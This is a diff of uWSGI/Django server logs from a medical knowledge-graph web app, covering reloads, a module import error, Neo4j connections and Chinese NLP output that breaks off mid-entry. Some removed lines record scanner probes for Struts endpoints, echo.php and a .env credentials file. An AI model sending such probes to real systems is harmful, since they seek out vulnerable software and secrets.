-spawned uWSGI worker 4 (pid: 30168, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-Internal Server Error: /
-Traceback (most recent call last):
-  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/base.py", line 111, in _get_response
-    resolver_match = resolver.resolve(request.path_info)
-  File "/usr/local/lib/python3.7/site-packages/django/urls/resolvers.py", line 491, in resolve
-    for pattern in self.url_patterns:
-  File "/usr/local/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
-    res = instance.__dict__[self.name] = self.func(instance)
-  File "/usr/local/lib/python3.7/site-packages/django/urls/resolvers.py", line 533, in url_patterns
-    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
-  File "/usr/local/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
-    res = instance.__dict__[self.name] = self.func(instance)
-  File "/usr/local/lib/python3.7/site-packages/django/urls/resolvers.py", line 526, in urlconf_module
-    return import_module(self.urlconf_name)
-  File "/usr/local/lib/python3.7/importlib/__init__.py", line 127, in import_module
-    return _bootstrap._gcd_import(name[level:], package, level)
-  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
-  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
-  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
-  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
-  File "<frozen importlib._bootstrap_external>", line 728, in exec_module
-  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
-  File "./Django/urls.py", line 35, in <module>
-    from . import distinguish_view
-  File "./Django/distinguish_view.py", line 9, in <module>
-    from toolkit.nlp.NER import NER
-  File "./toolkit/nlp/NER.py", line 4, in <module>
-    from ..ssh import ssh
-ModuleNotFoundError: No module named 'toolkit.ssh'
-[pid: 30168|app: 0|req: 1/1] 101.251.242.238 () {38 vars in 586 bytes} [Sat Apr 20 08:36:03 2019] GET / => generated 126739 bytes in 756 msecs (HTTP/1.1 500) 4 headers in 130 bytes (1 switches on core 0)
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 30168|app: 0|req: 2/2] 186.47.225.230 () {32 vars in 453 bytes} [Sat Apr 20 08:39:02 2019] GET / => generated 12678 bytes in 417 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-[uwsgi-python-reloader] module/file ./toolkit/nlp/NER.py has been modified
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 30165)...
-Gracefully killing worker 2 (pid: 30166)...
-Gracefully killing worker 3 (pid: 30167)...
-Gracefully killing worker 4 (pid: 30168)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sat Apr 20 08:43:26 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x13e41c0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x13e41c0 pid: 19822 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19822)
-spawned uWSGI worker 1 (pid: 2233, cores: 2)
-spawned uWSGI worker 2 (pid: 2234, cores: 2)
-spawned uWSGI worker 3 (pid: 2235, cores: 2)
-spawned uWSGI worker 4 (pid: 2236, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 2235|app: 0|req: 1/1] 89.21.219.158 () {32 vars in 452 bytes} [Sat Apr 20 09:01:21 2019] GET / => generated 12678 bytes in 1032 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[uwsgi-python-reloader] module/file ./toolkit/nlp/NER.py has been modified
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 2233)...
-Gracefully killing worker 2 (pid: 2234)...
-Gracefully killing worker 3 (pid: 2235)...
-Gracefully killing worker 4 (pid: 2236)...
+Gracefully killing worker 1 (pid: 6836)...
+Gracefully killing worker 2 (pid: 6837)...
+Gracefully killing worker 3 (pid: 6838)...
+Gracefully killing worker 4 (pid: 6839)...
+[pid: 6839|app: 0|req: 39/50] 124.160.57.70 () {52 vars in 1149 bytes} [Mon Apr 22 05:31:44 2019] POST /accounts/login/ => generated 0 bytes in 399 msecs (HTTP/1.1 302) 8 headers in 513 bytes (1 switches on core 0)
 worker 1 buried after 1 seconds
 worker 2 buried after 1 seconds
 worker 4 buried after 1 seconds
@@ -415,7 +192,7 @@ closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
 found fd 3 mapped to socket 0 (127.0.0.1:8000)
 running /usr/local/bin/uwsgi
 [uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sat Apr 20 09:03:18 2019] ***
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 05:31:46 2019] ***
 compiled with version: 8.3.0 on 16 March 2019 06:35:56
 os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
 nodename: VM_0_13_centos
@@ -437,7 +214,7 @@ uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x24901c0
+Python main interpreter initialized at 0x1b931c0
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 python threads support enabled
@@ -445,341 +222,75 @@ your server socket listen backlog is limited to 100 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 416880 bytes (407 KB) for 8 cores
 *** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x24901c0 pid: 19822 (default app)
+WSGI app 0 (mountpoint='') ready in 6 seconds on interpreter 0x1b931c0 pid: 19822 (default app)
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 *** uWSGI is running in multiple interpreter mode ***
 gracefully (RE)spawned uWSGI master process (pid: 19822)
-spawned uWSGI worker 1 (pid: 4149, cores: 2)
-spawned uWSGI worker 2 (pid: 4150, cores: 2)
-spawned uWSGI worker 3 (pid: 4151, cores: 2)
-spawned uWSGI worker 4 (pid: 4156, cores: 2)
+spawned uWSGI worker 1 (pid: 11270, cores: 2)
+spawned uWSGI worker 2 (pid: 11271, cores: 2)
+spawned uWSGI worker 3 (pid: 11272, cores: 2)
+spawned uWSGI worker 4 (pid: 11273, cores: 2)
 Python auto-reloader enabled
 数据库已存在！
 create neo4j class ...
 connect succeed
 数据库已存在！
-[pid: 4156|app: 0|req: 1/1] 185.47.64.246 () {32 vars in 453 bytes} [Sat Apr 20 09:23:53 2019] GET / => generated 12678 bytes in 1197 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-Not Found: /struts2-rest-showcase/orders.xhtml
-[pid: 4156|app: 0|req: 2/2] 119.29.163.219 () {40 vars in 2566 bytes} [Sat Apr 20 09:26:47 2019] GET /struts2-rest-showcase/orders.xhtml => generated 11039 bytes in 75 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 1)
-Not Found: /index.action
-[pid: 4156|app: 0|req: 3/3] 119.29.163.219 () {40 vars in 2500 bytes} [Sat Apr 20 09:26:48 2019] GET /index.action => generated 10973 bytes in 7 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 0)
-Not Found: /index.do
-[pid: 4156|app: 0|req: 4/4] 119.29.163.219 () {40 vars in 2488 bytes} [Sat Apr 20 09:26:48 2019] GET /index.do => generated 10961 bytes in 7 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 1)
-[uwsgi-python-reloader] module/file ./toolkit/nlp/NER.py has been modified
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 4149)...
-Gracefully killing worker 2 (pid: 4150)...
-Gracefully killing worker 3 (pid: 4151)...
-Gracefully killing worker 4 (pid: 4156)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sat Apr 20 09:31:14 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x23fb1c0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x23fb1c0 pid: 19822 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19822)
-spawned uWSGI worker 1 (pid: 6756, cores: 2)
-spawned uWSGI worker 2 (pid: 6757, cores: 2)
-spawned uWSGI worker 3 (pid: 6758, cores: 2)
-spawned uWSGI worker 4 (pid: 6759, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 6756|app: 0|req: 1/1] 124.160.57.70 () {42 vars in 811 bytes} [Sat Apr 20 09:39:22 2019] GET / => generated 12678 bytes in 1206 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-287====8
-{'title': '导致胃酸过多的14种食物', 'abstract': '胃酸过多会导致人恶心、腹胀和反酸等，所以要积极寻找导致胃酸的食物并杜绝它，才能保持身体健康。', 'url': 'https://ys.99.com.cn/wuqu/592477.htm'}
-[pid: 6756|app: 0|req: 2/2] 124.160.57.70 () {44 vars in 877 bytes} [Sat Apr 20 09:39:24 2019] GET /views/console/ => generated 13387 bytes in 441 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-Invalid HTTP_HOST header: '_'. The domain name provided is not valid according to RFC 1034/1035.
-Bad Request: /
-[pid: 6756|app: 0|req: 3/3] 104.152.52.22 () {30 vars in 364 bytes} [Sat Apr 20 09:44:50 2019] GET / => generated 54859 bytes in 90 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
-[uwsgi-python-reloader] module/file ./toolkit/nlp/NER.py has been modified
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 6756)...
-Gracefully killing worker 2 (pid: 6757)...
-Gracefully killing worker 3 (pid: 6758)...
-Gracefully killing worker 4 (pid: 6759)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sat Apr 20 09:53:34 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x277f1c0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x277f1c0 pid: 19822 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19822)
-spawned uWSGI worker 1 (pid: 8688, cores: 2)
-spawned uWSGI worker 2 (pid: 8689, cores: 2)
-spawned uWSGI worker 3 (pid: 8690, cores: 2)
-spawned uWSGI worker 4 (pid: 8691, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 8688|app: 0|req: 1/1] 124.160.57.70 () {44 vars in 836 bytes} [Sat Apr 20 10:03:54 2019] GET / => generated 12678 bytes in 948 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[uwsgi-python-reloader] module/file ./toolkit/nlp/NER.py has been modified
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 8688)...
-Gracefully killing worker 2 (pid: 8689)...
-Gracefully killing worker 3 (pid: 8690)...
-Gracefully killing worker 4 (pid: 8691)...
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 1 buried after 2 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sat Apr 20 10:06:51 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x14e01c0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x14e01c0 pid: 19822 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19822)
-spawned uWSGI worker 1 (pid: 9968, cores: 2)
-spawned uWSGI worker 2 (pid: 9969, cores: 2)
-spawned uWSGI worker 3 (pid: 9970, cores: 2)
-spawned uWSGI worker 4 (pid: 9971, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 9971|app: 0|req: 1/1] 58.251.121.185 () {38 vars in 640 bytes} [Sat Apr 20 10:48:18 2019] GET /views/console => generated 0 bytes in 861 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 0)
-116====8
-{'title': '排毒效果最好的16种食物', 'abstract': '红枣怎么吃最好？红枣营养价值有哪些呢？今天小编推荐红枣的食疗方法，这样吃红枣最有营养。', 'url': 'https://ys.99.com.cn/zhinan/298508.htm'}
-[pid: 9971|app: 0|req: 2/2] 58.251.121.185 () {40 vars in 693 bytes} [Sat Apr 20 10:48:19 2019] GET /views/console/ => generated 13380 bytes in 341 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-Invalid HTTP_HOST header: '_'. The domain name provided is not valid according to RFC 1034/1035.
-Bad Request: /
-[pid: 9971|app: 0|req: 3/3] 93.113.125.89 () {30 vars in 332 bytes} [Sat Apr 20 11:28:31 2019] GET / => generated 54837 bytes in 34 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
-Not Found: /echo.php
-[pid: 9971|app: 0|req: 4/4] 139.162.88.63 () {32 vars in 408 bytes} [Sat Apr 20 12:02:22 2019] GET /echo.php?info=1234567890 => generated 10981 bytes in 11 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 1)
-Not Found: /.env.example
-[pid: 9971|app: 0|req: 5/5] 18.205.60.116 () {32 vars in 368 bytes} [Sat Apr 20 12:40:17 2019] GET /.env.example => generated 10973 bytes in 13 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 0)
-[pid: 9971|app: 0|req: 6/6] 124.160.57.70 () {42 vars in 812 bytes} [Sat Apr 20 13:09:39 2019] GET / => generated 12678 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-2====14
+[pid: 11271|app: 0|req: 1/1] 124.160.57.70 () {46 vars in 985 bytes} [Mon Apr 22 05:31:53 2019] GET / => generated 12997 bytes in 1646 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+33====6
 {'title': '哎呀，走丢了', 'abstract': '', 'url': 'javascript:void(0);'}
-[pid: 9971|app: 0|req: 7/7] 124.160.57.70 () {44 vars in 878 bytes} [Sat Apr 20 13:09:40 2019] GET /views/console/ => generated 13204 bytes in 296 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 9971|app: 0|req: 8/8] 124.160.57.70 () {44 vars in 880 bytes} [Sat Apr 20 13:09:42 2019] GET /views/consoles/ => generated 10464 bytes in 651 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
-[pid: 9971|app: 0|req: 9/9] 124.160.57.70 () {44 vars in 886 bytes} [Sat Apr 20 13:09:52 2019] GET /views/distinguish/ => generated 4075 bytes in 2 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
-/usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:39: CryptographyDeprecationWarning: encode_point has been deprecated on EllipticCurvePublicNumbers and will be removed in a future version. Please use EllipticCurvePublicKey.public_bytes to obtain both compressed and uncompressed point encoding.
-  m.add_string(self.Q_C.public_numbers().encode_point())
-/usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:96: CryptographyDeprecationWarning: Support for unsafe construction of public numbers from encoded data will be removed in a future version. Please use EllipticCurvePublicKey.from_encoded_point
-  self.curve, Q_S_bytes
-/usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:111: CryptographyDeprecationWarning: encode_point has been deprecated on EllipticCurvePublicNumbers and will be removed in a future version. Please use EllipticCurvePublicKey.public_bytes to obtain both compressed and uncompressed point encoding.
-  hm.add_string(self.Q_C.public_numbers().encode_point())
-------start------
-[connect success] | ip : 39.108.111.94
-result:
-Model loaded succeed [['假两性', 'n'], ['畸形', 'n'], ['是', 'v'], ['遗传', 'v'], ['性别', 'n'], ['，', 'w'], ['性腺', 'n'], ['性别', 'n'], ['和', 'c'], ['表型', 'n'], ['性别', 'n'], ['的', 'u'], ['不均一性', 'n'], ['，', 'w'], ['即', 'v'], ['性腺', 'n'], ['性别', 'n'], ['与', 'p'], ['遗传性', 'n'], ['别', 'd'], ['一致', 'a'], ['，', 'w'], ['而', 'c'], ['生殖', 'v'], ['导管', 'n'], ['和', 'c'], ['尿生殖窦', 'n'], ['的', 'u'], ['发育', 'v'], ['却', 'd'], ['具有', 'v'], ['异性', 'n'], ['的', 'u'], ['成分', 'n'], ['或', 'c'], ['兼', 'v'], ['有', 'v'], ['两性', 'n'], ['的', 'u'], ['特征', 'n'], ['，', 'w'], ['以', 'p'], ['遗传性别', 'n'], ['和', 'c'], ['性腺', 'n'], ['性别', 'n'], ['为', 'v'], ['基础', 'n'], ['，', 'w'], ['假两性', 'n'], ['畸形', 'n'], ['又', 'c'], ['可', 'v'], ['再', 'd'], ['分为', 'v'], ['女性假两性畸形', 'uw'], ['和', 'c'], ['男假两性畸形', 'uw'], ['。', 'w'], ['男假两性畸形', 'uw'], ['的', 'u'], ['基本', 'a'], ['特点', 'n'], ['是', 'v'], ['核型', 'n'], ['为', 'v'], ['46', 'm'], ['，', 'w'], ['XY', 'x'], ['，', 'w'], ['如果', 'c'], ['能', 'v'], ['发现', 'v'], ['性腺', 'n'], ['，', 'w'], ['肯定', 'd'], ['是', 'v'], ['睾丸', 'n'], ['，', 'w'], ['但', 'c'], ['外阴', 'n'], ['男性化', 'v'], ['不', 'd'], ['全', 'a'], ['，', 'w'], ['模棱两可', 'i'], ['，', 'w'], ['或是', 'c'], ['完全', 'a'], ['女性化', 'v'], ['，', 'w'], ['由于', 'c'], ['在', 'p'], ['胎儿', 'n'], ['时', 'g'], ['正常', 'a'], ['男性化', 'v'], ['的', 'u'], ['过程', 'n'], ['非常', 'd'], ['复杂', 'a'], ['，', 'w'], ['男假两性畸形', 'uw'], ['有', 'v'], ['许多', 'm'], ['种', 'q'], ['类型', 'n'], ['。', 'w']]
-
-------end------
-------start------
-[connect success] | ip : 39.108.111.94
-result:
-smart_open library not found; falling back to local-filesystem-only >> Synonyms load wordseg dict [/usr/local/lib/python3.5/site-packages/synonyms/data/vocab.txt] ... >> Synonyms on loading stopwords [/usr/local/lib/python3.5/site-packages/synonyms/data/stopwords.txt] ... >> Synonyms on loading vectors [/usr/local/lib/python3.5/site-packages/synonyms/data/words.vector] ... {'特征': ['特征', '特点', '形态', '特性', '构造', '外观上', '特质', '相似性', '基本特征', '不同之处'], 'XY': ['XY', 'Alien', '美版', 'NEO', 'ZZ', 'XX', '人口为120人', '都是', '；也', '</s>'], '性别': ['性别', '性倾向', '异性恋', '性别角色', '性取向', '性别歧视', '同性恋', '男性', '女性', '双性恋'], '基础': ['基础', '根基', '基石', '坚实', '框架', '系统化', '基础性', '典范', '为基础', '基本'], '女性化': ['女性化', '男性化', '阳刚', '孩子气', '温柔', '阴柔', '时髦', '单纯', '标新立异', '特立独行'], '遗传性': ['遗传性', '遗传病', '遗传疾病', '肾病', '病症', '病变', '性疾病', '内分泌', '帕金森氏症', '增生'], '许多': [], '导管': ['导管', '静脉', '气管', '小孔', '腹腔', '尿道', '支架', '毛细管', '食道', '穿孔'], '发育': ['发育', '胚胎发育', '生长发育', '成年期', '胚胎', '生殖', '愈合', '退化', '受精', '发育不良'], '过程': ['过程', '步骤', '流程', '处理过程', '操作过程', '现实生活', '每一次', '反复', '全过程', '更进一步'], '胎儿': ['胎儿', '婴儿', '妊娠', '胚胎', '新生儿', '早产', '子宫', '孕期', '胎盘', '孕妇'], '即': [], '完全': ['完全', '几乎', '基本上', '实际上', '仅仅', '无论如何', '全然', '实质上', '显然', '只不过'], '别': [], '兼': ['兼', '兼任', '后任', '身兼', '职', '充任', '曾为', '任副', '为副', '原任'], '却': [], '性腺': ['性腺', '排卵', '黄体', '激素', '乳腺', '甲状腺激素', '雌激素', '腺体', '生殖腺', '睾丸'], '或': [], '不均一性': [], '非常': ['非常', '十分', '相当', '极为', '极其', '更为', '并不', '更加', '比较', '颇为'], '模棱两可': ['模棱两可', '含糊', '含糊不清', '恰当', '暗示', '直截了当', '显然', '可取', '不对', '仅仅只是'], '遗传性别': [], '异性': ['异性', '性伴侣', '异性恋', '伴侣', '男女', '男方', '性生活', '陌生人', '男孩子', '在生活中'], '再': ['再', '再行', '便', '先', '再继续', '再次', '于是又', '如此一来', '日后', '再进一步'], '由于': [], '发现': ['发现', '找到', '辨认出', '发掘出', '注意到', '挖掘出', '推测', '断定', '见到', '推断出'], '能': [], '生殖': ['生殖', '受精', '配子', '胚胎', '卵子', '排卵', '卵巢', '生殖细胞', '受精卵', '有性'], '核型': [], '特点': ['特点', '特征', '特色', '优点', '不同之处', '特性', '在结构上', '结构上', '表现形式', '基本特征'], '肯定': ['肯定', '认同', '赞许', '信服', '赞同', '应有', '负责任', '毫无疑问', '称许', '无疑'], '。': [], '不': [], '种': [], '类型': ['类型', '类别', '种类', '特性', '各种类型', '一般来说', '子类', '多种类型', '型式', '并不一定'], '而': [], '两性': [], '遗传': ['遗传', '基因', '遗传学', '遗传基因', '性状', '基因型', '表型', '基因突变', '突变', '表现型'], '有': [], '===': [], '畸形': ['畸形', '病变', '肥胖', '发育不良', '病症', '遗传性', '睾丸', '斜视', '小头', '脊柱'], '又': [], '分为': ['分为', '分成', '分作', '细分', '分别为', '划分', '包含', '统称', '总称', '可分'], '表型': ['表型', '性状', '遗传', '表现型', '基因型', '特异性', '环境因素', '表观', '变异', '遗传基因'], '在': [], '一致': ['一致', '完全一致', '明确', '赞同', '恰当', '保持一致', '相符', '相一致', '相反', '原则上'], '可': [], '全': ['全', '仅有', '以外', '均', '全部都是', '同类型', '全都', '正因如此', 'Pardosa', '</s>'], '基本': ['基本', '基本上', '前提', '整体', '理论上', '大体', '也就是说', '必需', '大体上', '原则上'], '为': [], '复杂': ['复杂', '简单', '繁复', '十分复杂', '有用', '多样', '精细', '繁杂', '适合于', '比较简单'], '正常': ['正常', '长时间', '情况下', '正常人', '出现异常', '较长时间', '但会', '短时间', '也就是说', '经常性'], '与': [], '以': [], '或是': [], '46': [], '假两性': [], '具有': ['具有', '具备', '带有', '不具备', '具', '有着', '不具', '很强', '兼具', '较强'], '的': [], '，': [], '外阴': ['外阴', '生殖器', '乳头', '阴囊', '阴部', '生殖器官', '性器官', '指甲', '龟头', '眼部'], '如果': [], '但': [], '男假两性畸形': [], '女性假两性畸形': [], '是': [], '尿生殖窦': [], '和': [], '睾丸': ['睾丸', '卵巢', '阴囊', '阴茎', '子宫', '生殖器', '乳头', 